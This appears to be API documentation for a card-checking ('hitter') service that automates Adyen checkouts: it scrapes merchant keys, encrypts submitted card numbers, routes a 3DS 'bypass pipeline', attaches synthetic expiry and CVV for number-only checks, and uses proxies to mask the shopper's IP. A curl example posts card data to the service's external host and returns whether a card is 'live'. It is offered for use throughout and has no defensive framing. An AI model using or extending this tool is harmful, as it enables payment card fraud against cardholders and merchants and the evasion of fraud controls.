THE FLOW / seven steps

One /hit call runs the entire Adyen checkout chain automatically. No browser, no manual steps.

1. SCRAPE
→
2. BOOTSTRAP
→
3. PUBKEY
→
4. ENCRYPT
→
5. SUBMIT
→
6. 3DS
→
7. PARSE
#StageWhat it does
1scrapefetch the checkout page, extract clientKey / sessionId / sessionData / publicKey / linkId / amount / merchant
2bootstrapPay-by-Link session setup — fresh sessionId + sessionData per attempt
3pubkeyresolve exp|mod public key from the clientKey when the page didn't expose it
4encryptCSE/JWE encrypt the card — auto-detects v6 JWE vs legacy CSE
5submitsession payment, with direct endpoint-probing fallback for merchant checkouts
63dsresolve IdentifyShopper / ChallengeShopper / RedirectShopper via the bypass pipeline
7parsemap the response to a clean decline code + psp + amount
02

CARD INPUT / one string

Cards are pipe-delimited, same as the encryptor. Year accepts 2 or 4 digits.

CC|MM|YY|CVV      // 2-digit year
CC|MM|YYYY|CVV    // 4-digit year
4111111111111111|12|28|737

■ CCN MODE

Set ccn:true and pass only the number — the engine auto-attaches a synthetic expiry + CVV (Amex-aware 4-digit) for CCN-check merchants.

03

PROXY INPUT / all formats

Optional proxy field routes the whole engine through your proxy.

host:port
user:pass@host:port
http://host:port
https://user:pass@host:port
socks4://host:port
socks5://user:pass@host:port
NOTE: the proxy is applied to every request in the chain — scrape, bootstrap, pubkey, submit, and 3DS resolution all ride the same proxy, so the shopper IP stays coherent.
04

/hit

Run the full flow on a single card.

POST/hit
Parameters
ParamTypeNotes
url REQUIREDstringcheckout page or Pay-by-Link URL
card REQUIREDstringCC|MM|YY|CVV
proxy OPTIONALstringsee proxy formats
ccn OPTIONALboolCCN-only mode (auto CVV)
country OPTIONALstringpin shopper geo (see §06)
Request
curl -s -X POST https://adyene-hitter.onrender.com/hit \
  -H 'Content-Type: application/json' \
  -d '{
    "url": "https://checkout.example.com/pay",
    "card": "4111111111111111|12|28|737",
    "proxy": "http://user:pass@host:port",
    "country": "US"
  }'
Response
{
  "success": true,
  "result": {
    "attempt": 1,
    "success": false,
    "decline_code": "insufficient_funds",
    "error": "Not enough balance (2)",
    "is_live": true,
    "psp": "P123456789",
    "merchant": "Example Shop",
    "amount": "USD 48.87",
    "response_time": 3.2,
    "3ds_attempted": true,
    "3ds_type": "ChallengeShopper",
    "3ds_resolved": true,
    "raw_response": { ...full Adyen response... }
  }
}
